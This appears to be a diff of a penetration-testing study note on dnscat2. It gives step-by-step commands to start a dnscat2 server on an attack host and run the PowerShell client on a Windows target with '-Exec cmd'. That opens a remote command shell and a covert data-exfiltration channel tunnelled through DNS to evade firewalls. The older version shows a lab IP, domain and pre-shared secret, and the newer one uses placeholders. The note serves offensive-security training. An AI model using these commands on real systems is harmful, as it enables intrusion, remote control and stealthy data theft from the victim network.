@@ -1,39 +1,48 @@
 **Overview:**
-- [Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. 
-- Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. 
-- However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic.
+- Dnscat2 is a tunneling tool that uses the DNS protocol to send data between two hosts over an encrypted C2 channel, embedding traffic inside TXT records.
+- In corporate Active Directory environments, the local DNS server handles internal resolution and routes external queries outward. Dnscat2 abuses this by sending data-carrying requests to an external server instead of legitimate DNS queries, enabling covert exfiltration that bypasses firewalls stripping HTTPS or sniffing traffic.
+- The server runs on the attack host and provides a pre-shared secret. The client on the Windows target uses this secret to authenticate and encrypt the tunnel.
 ---
+## Server Setup (Attack Host)
+
 ```
 git clone https://github.com/iagox86/dnscat2.git
-
 cd dnscat2/server/
 sudo gem install bundler
 sudo bundle install
 ```
-installation
+
+Clone the repository and install Ruby dependencies.
 
 ```
-sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+sudo ruby dnscat2.rb --dns host=<lhost>,port=53,domain=<domain> --no-cache
 ```
-start the dnscat2 server
-After running the server, it will provide the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.
+
+Start the dnscat2 server. `host` attack host IP, `port` DNS port, `domain` target domain. `--no-cache` disables caching. The server outputs a pre-shared secret upon startup, required for client authentication.
+
+---
+## Client Setup (Windows Target)
 
 ```
 git clone https://github.com/lukebaggett/dnscat2-powershell.git
 ```
-clone dnscat2-powershell file and transfer it on the target host
 
-```
+Clone the PowerShell client on the attack host and transfer it to the Windows target.
+
+```powershell
 Import-Module .\dnscat2.ps1
+```
 
+Import the dnscat2 PowerShell module on the Windows target.
+
+```powershell
+Start-Dnscat2 -DNSserver <lhost> -Domain <domain> -PreSharedSecret <secret> -Exec cmd
 ```
-import the module 
-```
- Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
-```
-establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
+
+Establish the tunnel back to the attack host. `-DNSserver` attack host IP, `-Domain` target domain, `-PreSharedSecret` secret from server output, `-Exec cmd` sends a CMD shell session through the tunnel.
 
 ```
 dnscat2> window -i 1
 ```
-interact with the session
+
+Interact with the established session. `-i` specifies the session window index.
